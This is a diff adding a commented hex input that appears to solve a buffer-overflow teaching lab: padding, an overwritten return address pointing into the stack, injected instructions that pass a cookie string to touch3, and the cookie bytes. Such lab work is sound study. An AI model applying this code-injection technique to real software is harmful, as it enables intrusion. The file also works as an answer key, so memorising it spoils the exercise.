@@ -1,0 +1,13 @@
+11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff 00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff 00 11 22 33 44 55 66 77 88 
+/* The return target is the stack address */
+a8 dc 61 55 00 00 00 00 
+/* Now the program will return to the stack, right after the return address */
+/* return address: 0x5561dca8 */
+/* Insert code to save the string of cookie and return to touch3 */
+/* How many bytes of code do we need to insert? */
+/* Just insert the string right after the code */
+48 c7 c7 b5 dc 61 55 /* movq $0x5561dcb5, %rdi */
+68 fa 18 40 00       /* pushq $0x4018fa */
+c3                   /* retq */
+/* The ascii encoding of cookie: 0x59b997fa, beginning at address 0x5561dcb5 */
+35 39 62 39 39 37 66 61 
